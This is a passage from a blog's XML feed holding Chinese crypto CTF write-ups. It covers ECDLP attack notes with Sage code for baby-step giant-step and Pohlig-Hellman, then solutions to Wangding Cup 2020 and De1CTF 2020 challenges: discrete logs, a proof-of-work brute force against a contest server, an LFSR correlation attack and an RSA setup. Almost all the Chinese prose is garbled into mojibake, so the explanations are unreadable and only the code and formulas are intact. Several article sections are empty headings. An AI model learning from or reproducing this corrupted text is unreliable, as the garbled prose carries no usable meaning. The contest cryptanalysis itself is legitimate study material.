id="Code-3"><a href="#Code-3" class="headerlink" title="[Code]"></a>[Code]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bsgs</span><span class="params">(alpha, beta, modulus, upper_bound=None)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> upper_bound:</span><br><span class="line">        upper_bound = Mod(alpha, modulus).multiplicative_order()</span><br><span class="line">    m = ceil(sqrt(upper_bound))</span><br><span class="line">    S = &#123;pow(alpha, j, modulus):j <span class="keyword">for</span> j <span class="keyword">in</span> range(m + <span class="number">1</span>)&#125;</span><br><span class="line">    gs = Mod(alpha, modulus)^(-m)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> beta <span class="keyword">in</span> S:</span><br><span class="line">            <span class="keyword">return</span> (i * m + S[beta])</span><br><span class="line">        beta = (beta * gs) % modulus</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pohlig_hellman</span><span class="params">(beta, alpha, N)</span>:</span></span><br><span class="line">    beta, alpha = Mod(beta, N), Mod(alpha, N)</span><br><span class="line">    ord = alpha.multiplicative_order()</span><br><span class="line">    f = ord.factor()</span><br><span class="line">    prime_order_mod = [<span class="number">0</span>] * len(f)</span><br><span class="line">    <span class="keyword">for</span> i, (p, r) <span class="keyword">in</span> enumerate(f):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(r):</span><br><span class="line">            pmod = bsgs(alpha**(ord // p), (beta / alpha**prime_order_mod[i])**(ord // p**(j+<span class="number">1</span>)), N, p - <span class="number">1</span>)</span><br><span class="line">            prime_order_mod[i] += pmod * (p**j)</span><br><span class="line">    <span class="keyword">return</span> crt(prime_order_mod, [p**r <span class="keyword">for</span> (p, r) <span class="keyword">in</span> f])</span><br></pre></td></tr></table></figure><h2 id="Attacking-the-Elliptic-Curve-Discrete-Logarithm-Problem"><a href="#Attacking-the-Elliptic-Curve-Discrete-Logarithm-Problem" class="headerlink" title="Attacking the Elliptic Curve Discrete Logarithm Problem"></a>Attacking the Elliptic Curve Discrete Logarithm Problem</h2><blockquote><p>Attacks on the ECDLP can be split into two main categories:</p><ol><li>attacks that work in the general setting regardless of properties of a given elliptic curve.</li><li>attacks that use specific properties of the elliptic curve to develop a different approach.</li></ol></blockquote><h3 id="3-1-General-Attacks"><a href="#3-1-General-Attacks" class="headerlink" title="3.1    General Attacks"></a>3.1    General Attacks</h3><p>å¯¹äºæ±‚è§£DLP/ECDLPçš„ä¸€èˆ¬æ€§æ–¹æ³•ï¼Œæœ¬æ–‡é‡Œçš„ä»£ç å¤§å¤šæœ‰å¯¹sageæºç è¿›è¡Œå‚è€ƒï¼ˆä¸”sageæœ‰è½®å­ï¼‰ï¼Œä½†ä½œä¸º<strong>åŸç†æ€§æ–‡ç« </strong>ï¼Œä»è‡ªå·±ç¼–å†™ä»¥åŠ æ·±ç†è§£orçµæ´»ä¿®æ”¹ï¼ˆæ€»ä¸ä¼šç‰¹æ®Šæƒ…å†µä¸‹æœ‰äººè½åˆ°ç›´æ¥æ”¹sageæºç å§ä¸ä¼šå§ä¸ä¼šå§</p><h4 id="3-1-1-Baby-Step-Giant-Step-Algorithm"><a href="#3-1-1-Baby-Step-Giant-Step-Algorithm" class="headerlink" title="3.1.1    Baby-Step, Giant-Step Algorithm"></a>3.1.1    Baby-Step, Giant-Step Algorithm</h4><h5 id="Theorem-4"><a href="#Theorem-4" class="headerlink" title="[Theorem]"></a>[Theorem]</h5><p>é˜¶ä¸ºnçš„åŸºç‚¹Pç”Ÿæˆ$E(F_{p})$ï¼Œä¸”$Q\in E(F_{p})$ï¼ŒQ=kP.</p><p>ä»¤$m=\lceil n\rceil$ï¼Œå³å¯å°†kè¡¨ç¤ºä¸º$im+j(0\leq i,j\leq m)$. æœ‰</p><script type="math/tex; mode=display">Q=kP=(im+j)P=imP+jP\\Q-i(mP)=jP</script><p>ä¸BSGSçš„DLPé—®é¢˜ä¸€æ ·ï¼Œå»ºç«‹$j\in [0,m]$çš„jPå­—å…¸ï¼Œå†éå†iå¯»æ‰¾ç¢°æ’å³å¯.</p><h5 id="Code-4"><a href="#Code-4" class="headerlink" title="[Code]"></a>[Code]</h5><h4 id="3-1-2-Pollardâ€™s-Ï-Method"><a href="#3-1-2-Pollardâ€™s-Ï-Method" class="headerlink" title="3.1.2    Pollardâ€™s Ï-Method"></a>3.1.2    Pollardâ€™s Ï-Method</h4><h4 id="3-1-3-Pollardâ€™s-Î»-Method"><a href="#3-1-3-Pollardâ€™s-Î»-Method" class="headerlink" title="3.1.3    Pollardâ€™s Î»-Method"></a>3.1.3    Pollardâ€™s Î»-Method</h4><h4 id="3-1-4-The-Pohlig-Hellman-Method"><a href="#3-1-4-The-Pohlig-Hellman-Method" class="headerlink" title="3.1.4    The Pohlig-Hellman Method"></a>3.1.4    The Pohlig-Hellman Method</h4><h5 id="Theorem-5"><a href="#Theorem-5" class="headerlink" title="[Theorem]"></a>[Theorem]</h5><p>$Q,P\in E(F_{p}),Q=kP$. ä»¤nä¸ºPç”Ÿæˆå­ç¾¤çš„é˜¶ï¼Œ$n=\prod_{i=1}^{k}p_{i}^{r_{i}}$.</p><p>ç±»æ¯”DLPä¸Šçš„Pohlig-Hellmanï¼Œæˆ‘ä»¬åŒæ ·è¦å»å¯»æ‰¾$k_{i}\equiv k(mod\ p_{i}^{r_{i}})$.</p><p>$k\equiv x_{0}+x_{1}p+x_{2}p^{2}+â€¦+x_{r-1}p^{r-1}\quad mod\ p^{r}$ï¼Œ$0\leq x_{i}\leq p-1.$</p><p>ä»¤é›†åˆ$T_{i}=\{j\frac{n}{p_{i}}P:0\leq j\leq p_{i}-1\}.$ï¼Œä¸”æœ‰</p><p>$\frac{n}{p_{i}}Q=\frac{n}{p_{i}}([x_{0}+x_{1}p_{i}+x_{2}p_{i}^2+â€¦+x_{r-1}p_{i}^{r-1}]P)=x_{0}\frac{n}{p_{i}}P+nmP=x_{0}\frac{n}{p_{i}}P.$</p><p>å³å¯åœ¨$T_{i}$ä¸­å¯»æ‰¾ç¢°æ’ï¼Œä»è€Œå¾—åˆ°$x_{0}$. </p><p>å†ä»¤$Q_{1}=Q-x_{0}P$. è®¡ç®—$\frac{n}{p_{i}^2}Q_{1}$ä¸$T_{i}$çš„ç¢°æ’ï¼Œå¾—åˆ°$x_{1}$ï¼Œç»§ç»­å‡å¹‚å³å¯. æœ€åCRT.</p><h5 id="Code-5"><a href="#Code-5" class="headerlink" title="[Code]"></a>[Code]</h5><h3 id="3-2-Specialized-Attacks"><a href="#3-2-Specialized-Attacks" class="headerlink" title="3.2    Specialized Attacks"></a>3.2    Specialized Attacks</h3><h4 id="3-2-1-Anomalous-Curves"><a href="#3-2-1-Anomalous-Curves" class="headerlink" title="3.2.1    Anomalous Curves"></a>3.2.1    Anomalous Curves</h4><h4 id="3-2-2-The-MOV-Attack"><a href="#3-2-2-The-MOV-Attack" class="headerlink" title="3.2.2    The MOV Attack"></a>3.2.2    The MOV Attack</h4><h4 id="3-2-3-Weil-Descent-and-the-GHS-Attack"><a href="#3-2-3-Weil-Descent-and-the-GHS-Attack" class="headerlink" title="3.2.3    Weil Descent and the GHS Attack"></a>3.2.3    Weil Descent and the GHS Attack</h4>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Elliptic Curve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp(ç½‘é¼æ¯2020é’é¾™ç»„) - Crypto</title>
      <link href="/2020/05/10/WriteUp-%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-Crypto/"/>
      <url>/2020/05/10/WriteUp-%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-Crypto/</url>
      
        <content type="html"><![CDATA[<h3 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h3><p>Cryptoå‡ºé¢˜è´¨é‡æŒºå·®çš„â€¦å…¶ä»–æ–¹å‘å…¨ç¨‹çœ‹é˜Ÿå‹è¾“å‡ºï¼ˆ8è¯´äº†çº¿ä¸‹æ’¤ç¡•è§</p><p><img src= "/img/loading.gif" data-src="/2020/05/10/WriteUp-%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-Crypto/Rank.png" alt></p><h3 id="you-raise-me-up"><a href="#you-raise-me-up" class="headerlink" title="you raise me up"></a>you raise me up</h3><p>$mod\ 2^{512}$çš„DLPï¼ŒæŒ‰ä½æ¢å¤å³å¯ï¼ˆèµ›åçœ‹å…¶ä»–å¸ˆå‚…åŸºæœ¬éƒ½æ˜¯ç”¨çš„sageçš„<code>discrete_log</code>ï¼Œæ‰’äº†ä¸‹æºç å‘ç°è¿™ä¸ªå†…ç½®å‡½æ•°ç”¨çš„PHç®—æ³•ï¼Œè€Œè¿™é¢˜çš„é˜¶åˆè¶³å¤Ÿå…‰æ»‘ï¼Œæ‰€ä»¥ä¹Ÿèƒ½ç§’å‡ºï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">2</span></span><br><span class="line">phi = <span class="number">1</span></span><br><span class="line">flag = [<span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">513</span>):</span><br><span class="line">    n *= <span class="number">2</span></span><br><span class="line">    phi *= <span class="number">2</span></span><br><span class="line">    candidate = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="keyword">if</span> pow(m, i, n) == c % n:</span><br><span class="line">            candidate.append(i)</span><br><span class="line">    flag = [x + phi <span class="keyword">for</span> x <span class="keyword">in</span> candidate] + candidate</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    print(long_to_bytes(i))</span><br></pre></td></tr></table></figure><h3 id="easy-ya"><a href="#easy-ya" class="headerlink" title="easy_ya"></a>easy_ya</h3><p>å…ˆé¶æœºäº¤äº’proof_of_workæ‹¿æ•°æ®ï¼ˆæ²¡æç¤ºæ˜æ–‡ä¸²é•¿åº¦ï¼Œä½†æ˜¯ä¸€çŒœ4å°±ä¸­äº†- -</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"39.96.90.217"</span>, <span class="string">"17497"</span>)</span><br><span class="line">io.recvuntil(<span class="string">"= "</span>)</span><br><span class="line">suffix = io.recvline().strip().decode(<span class="string">"utf-8"</span>)</span><br><span class="line">print(suffix)</span><br><span class="line">io.recvuntil(<span class="string">"openssl_"</span>)</span><br><span class="line">mode = io.recvuntil(<span class="string">"&gt;"</span>)[:<span class="number">-1</span>].decode(<span class="string">"utf-8"</span>)</span><br><span class="line">print(mode)</span><br><span class="line">pts = itertools.product(string.printable, repeat=<span class="number">4</span>)</span><br><span class="line">len = <span class="number">100</span>**<span class="number">4</span></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> pt <span class="keyword">in</span> pts:</span><br><span class="line">    <span class="keyword">if</span> cnt % <span class="number">1000</span> == <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">"&#123;&#125;%"</span>.format(<span class="number">100</span>*cnt/len))</span><br><span class="line">    p = <span class="string">""</span>.join(list(pt))</span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">"sha1"</span>:</span><br><span class="line">        ct = sha1(p.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="string">"sha224"</span>:</span><br><span class="line">        ct = sha224(p.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="string">"sha256"</span>:</span><br><span class="line">        ct = sha256(p.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="string">"sha384"</span>:</span><br><span class="line">        ct = sha384(p.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="string">"sha512"</span>:</span><br><span class="line">        ct = sha512(p.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="string">"md5"</span>:</span><br><span class="line">        ct = md5(p.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> ct[:<span class="number">20</span>] == suffix:</span><br><span class="line">        print(p)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    cnt += <span class="number">1</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>ç„¶åGCDåˆ†è§£RSAæ¨¡æ•°ï¼Œè¿›è€Œæ‹¿åˆ°Key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">136</span>, <span class="number">145</span>, <span class="number">137</span>, <span class="number">128</span>, <span class="number">136</span>, <span class="number">177</span>, <span class="number">151</span>, <span class="number">160</span>, <span class="number">191</span>, <span class="number">167</span>, <span class="number">129</span>, <span class="number">153</span>, <span class="number">178</span>, <span class="number">129</span>, <span class="number">149</span>, <span class="number">191</span>, <span class="number">174</span>, <span class="number">137</span>]</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°Keyä»¥åï¼ŒåˆçŸ¥æ¯ä¸ªåˆ†ç»„åŠ å¯†åçš„å¯†æ–‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint = nhex((y &lt;&lt; <span class="number">52</span>) ^ (pads &lt;&lt; <span class="number">20</span>) ^ z)</span><br></pre></td></tr></table></figure><p>åˆ™æœ‰ <code>y = hint &gt;&gt; 52</code></p><p><code>high_pads = (cipher % (2**52)) &gt;&gt; 32 &lt;&lt; 12</code></p><p><code>low_z = cipher % (2**20)</code></p><p>ä¸­é—´æœªçŸ¥çš„12æ¯”ç‰¹ç›´æ¥çˆ†ç ´å³å¯ï¼Œåˆæœ‰ <code>(32 * pad) % 0x100000000 == pads</code></p><p>å³padé«˜5ä½æœªçŸ¥ï¼ŒåŒæ ·çˆ†ç ´å³å¯ï¼Œç¼–å†™è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">limit = <span class="keyword">lambda</span> n: n &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(cipher)</span>:</span></span><br><span class="line">    flags = []</span><br><span class="line">    a = <span class="number">2291239296</span></span><br><span class="line">    b = <span class="number">2293340064</span></span><br><span class="line">    c = <span class="number">3215425945</span></span><br><span class="line">    d = <span class="number">2994836927</span></span><br><span class="line">    high_pads = (cipher % (<span class="number">2</span>**<span class="number">52</span>)) &gt;&gt; <span class="number">32</span> &lt;&lt; <span class="number">12</span></span><br><span class="line">    mid = (cipher % (<span class="number">2</span>**<span class="number">32</span>)) &gt;&gt; <span class="number">20</span></span><br><span class="line">    low_z = cipher % (<span class="number">2</span>**<span class="number">20</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range(<span class="number">2</span>**<span class="number">12</span>)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">5</span>):</span><br><span class="line">            pads = high_pads + i</span><br><span class="line">            <span class="comment"># (32 * pad) % 0x100000000 == pads</span></span><br><span class="line">            low_pad = pads &gt;&gt; <span class="number">5</span></span><br><span class="line">            y = cipher &gt;&gt; <span class="number">52</span></span><br><span class="line">            z = ((i ^ mid) &lt;&lt; <span class="number">20</span>) + low_z</span><br><span class="line">            pad = (j &lt;&lt; <span class="number">27</span>) + low_pad</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">                z = limit(z - ((y*<span class="number">16</span> + c) ^ (y + pads) ^ ((y&gt;&gt;<span class="number">5</span>) + d)))</span><br><span class="line">                y = limit(y - ((z*<span class="number">16</span> + a) ^ (z + pads) ^ ((z&gt;&gt;<span class="number">5</span>) + b)))</span><br><span class="line">                pads = limit(pads - pad)</span><br><span class="line">            <span class="keyword">if</span> pads != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            flag = long_to_bytes(y) + long_to_bytes(z)</span><br><span class="line">            mark = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> flag:</span><br><span class="line">                <span class="keyword">if</span> <span class="number">0</span> &lt; _ &lt; <span class="number">32</span> <span class="keyword">or</span> _ &gt;= <span class="number">128</span>:</span><br><span class="line">                    mark = <span class="literal">False</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> mark == <span class="literal">True</span>:</span><br><span class="line">                flags.append(flag)</span><br><span class="line">    <span class="keyword">return</span> flags</span><br><span class="line"></span><br><span class="line">flag1 = decode(<span class="number">0xa5c5825052a4f2f97d50d</span>)</span><br><span class="line">flag2 = decode(<span class="number">0x916584dbfa561434b59a9</span>)</span><br><span class="line">flag3 = decode(<span class="number">0xd4148395b3a564bc85ef5</span>)</span><br><span class="line">flag4 = decode(<span class="number">0xb165eb6c68948a4860b12</span>)</span><br><span class="line">flag5 = decode(<span class="number">0xe698497f90f8b6fa51e0a</span>)</span><br></pre></td></tr></table></figure><p>åŠåˆ†é’Ÿå‡ºç»“æœ</p><p><img src= "/img/loading.gif" data-src="/2020/05/10/WriteUp-%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-Crypto/TzFGhGpqfDJCncgl.png" alt></p><h3 id="boom"><a href="#boom" class="headerlink" title="boom"></a>boom</h3><p>ï¼Ÿ</p><p>md5åœ¨çº¿æŸ¥åº“ + ä¸‰å…ƒä¸€æ¬¡æ–¹ç¨‹ + ä¸€å…ƒäºŒæ¬¡æ–¹ç¨‹ï¼ˆç»äº†</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp(De1CTF2020) - Crypto</title>
      <link href="/2020/05/04/WriteUp-De1CTF2020-Crypto/"/>
      <url>/2020/05/04/WriteUp-De1CTF2020-Crypto/</url>
      
        <content type="html"><![CDATA[<h3 id="NLFSR"><a href="#NLFSR" class="headerlink" title="NLFSR"></a>NLFSR</h3><h4 id="é¢˜è§£åˆ†æ"><a href="#é¢˜è§£åˆ†æ" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p>åˆ†ææºç å‘ç°æ˜¯å››ä¸ªLFSRç»„åˆæˆçš„åŠ å¯†ç³»ç»Ÿï¼Œç›¸å…³ç³»æ•°åˆ†æå¦‚ä¸‹ï¼š</p><p><img src= "/img/loading.gif" data-src="/2020/05/04/WriteUp-De1CTF2020-Crypto/Snipaste_2020-05-04_16-26-21.png" alt></p><p>å‘ç°ç¬¬ä¸€ä¸ªLFSRç›¸å…³ç³»æ•°0.75ï¼Œç›¸å…³æ”»å‡»å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_key</span><span class="params">(p, mask, partMask)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">18</span>, <span class="number">2</span>**<span class="number">19</span>):</span><br><span class="line">        single_cipher = single_lfsr(a, mask, partMask, len(cipher))</span><br><span class="line">        correlation_value = correlation(single_cipher, cipher)</span><br><span class="line">        <span class="keyword">if</span> correlation_value &gt;= (p - <span class="number">0.05</span>) <span class="keyword">and</span> correlation_value &lt;= (p + <span class="number">0.05</span>):</span><br><span class="line">            print(<span class="string">"a is &#123;&#125;"</span>.format(a))</span><br><span class="line">            <span class="keyword">return</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ° a = 363445</p><p>å› ä¸º$x_{2}=0$æ—¶ï¼Œ$value=x_3\oplus x_4$ï¼›$x_2=1$æ—¶ï¼Œ$value=x_1$ï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªLFSRæµä¸æœ€ç»ˆæµä¸ä¸€è‡´çš„æ¯”ç‰¹ä½ä¸Šï¼Œç¬¬äºŒä¸ªLFSRæµä¸€å®šä¸º0</p><p>å–ç¬¬ä¸€ä¸ªLFSRæµä¸æœ€ç»ˆæµä¸ä¸€è‡´çš„è‡³å°‘19ä¸ªæ¯”ç‰¹ä½ï¼Œå³å¯æ¢å¤b</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">single_cipher_a = single_lfsr(a, ma, partMask, len(cipher))</span><br><span class="line"></span><br><span class="line">b0_pos = [] <span class="comment">#b==0çš„ä¸‹æ ‡</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2048</span>):</span><br><span class="line">    <span class="keyword">if</span> cipher[i] != single_cipher_a[i]:</span><br><span class="line">        b0_pos.append(i)</span><br><span class="line">b0_pos = b0_pos[:<span class="number">19</span>]</span><br><span class="line">        </span><br><span class="line">mb = <span class="number">0x40f3f</span></span><br><span class="line"></span><br><span class="line">mb_feedback = []</span><br><span class="line">mb_bin = bin(mb)[<span class="number">2</span>:].rjust(<span class="number">24</span>, <span class="string">'0'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">    <span class="keyword">if</span> mb_bin[i] == <span class="string">'1'</span>:</span><br><span class="line">        mb_feedback.append(i)</span><br><span class="line">mb_feedback.append(<span class="number">24</span>)</span><br><span class="line">mb_feedback = [_ - <span class="number">5</span> <span class="keyword">for</span> _ <span class="keyword">in</span> mb_feedback]</span><br><span class="line"><span class="comment"># mb_feedback = [0, 7, 8, 9, 10, 13, 14, 15, 16, 17, 18]</span></span><br><span class="line"></span><br><span class="line">cur = []</span><br><span class="line">F2 = GF(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">19</span>):</span><br><span class="line">    v = vector(F2, <span class="number">19</span>)</span><br><span class="line">    v[i] = <span class="number">1</span></span><br><span class="line">    cur.append(v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    v = vector(F2, <span class="number">19</span>)</span><br><span class="line">    cur19 = cur[<span class="number">-19</span>:]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> mb_feedback:</span><br><span class="line">        v += cur19[j]</span><br><span class="line">    cur.append(v)</span><br><span class="line">    </span><br><span class="line">cur = cur[<span class="number">19</span>:]</span><br><span class="line"></span><br><span class="line">left = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b0_pos:</span><br><span class="line">    left.append(list(cur[i]))</span><br><span class="line">A = Matrix(F2, left)</span><br><span class="line"></span><br><span class="line">A.right_kernel()</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/2020/05/04/WriteUp-De1CTF2020-Crypto/Snipaste_2020-05-04_16-26-15.png" alt>      </p><p>äºæ˜¯å¾—åˆ° b = 0b1111000110101010110 = 494934</p><p>æœ€åä¸¤ä¸ªLFSRç»„æˆçš„å¯†é’¥ç©ºé—´$2^{19}$ï¼Œç›´æ¥çˆ†ç ´å³å¯</p><p>å¾—åˆ° c = 4406ï¼Œd = 63</p><h3 id="easyRSA"><a href="#easyRSA" class="headerlink" title="easyRSA"></a>easyRSA</h3><h4 id="é¢˜è§£åˆ†æ-1"><a href="#é¢˜è§£åˆ†æ-1" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p>ç»™å‡º$e_{1},e_{2}$ï¼Œå¯¹åº”çš„ç§é’¥æ»¡è¶³</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">limit = gmpy2.iroot(n,<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line">r = random.randint(limit,limit*<span class="number">0x1000000000001</span>)</span><br><span class="line">d = gmpy2.next_prime(r)</span><br></pre></td></tr></table></figure><p>2048 bits Nä¸‹çš„è¿™ä¸ªä¸Šç•Œ(731 bits)æ˜¾ç„¶ä¸æ»¡è¶³Wienerå’ŒBoneh Durfeeï¼Œå› æ­¤é‡‡ç”¨è¿™ç¯‡<a href="howgrave-graham1999.pdf">paper</a>ä¸‹çš„æ”»å‡»æ–¹æ³•ï¼š</p><p>$g=gcd(p-1,q-1),\lambda(n)=\frac{\varphi(n)}{g},s=1-p-q$</p><p>ä¸”æœ‰$ed-k\lambda(n)=1$ï¼Œå¾—åˆ°$edg-kn=g+ks\quad 